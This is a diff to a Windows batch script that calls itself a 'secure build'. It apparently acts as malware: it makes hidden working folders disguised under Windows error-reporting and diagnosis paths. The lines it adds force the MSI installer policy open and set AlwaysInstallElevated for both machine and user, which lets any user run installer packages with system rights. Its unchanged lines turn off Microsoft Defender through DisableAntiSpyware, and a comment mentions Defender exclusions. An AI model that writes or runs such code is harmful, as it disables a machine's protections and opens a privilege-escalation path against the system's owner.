@@ -1,5 +1,5 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S2 - SDDL DC fix + valid accounts + exclusions/ACL
+REM OWN_SECURE BUILD 20260802S3 - neutralize DisableMSI + exclusions/ACL
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
@@ -14,7 +14,14 @@ set "TASKROOT=%SystemRoot%\System32\Tasks"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo secure_begin %DATE% %TIME% S1>>"%LOG%"
+echo secure_begin %DATE% %TIME% S3>>"%LOG%"
+
+REM --- Neutralize MSI block policies (1625) ---
+REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f >nul 2>&1
+reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
+reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f >nul 2>&1
 
 REM --- Defender: registry exclusions (policy + preference keys) ---
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
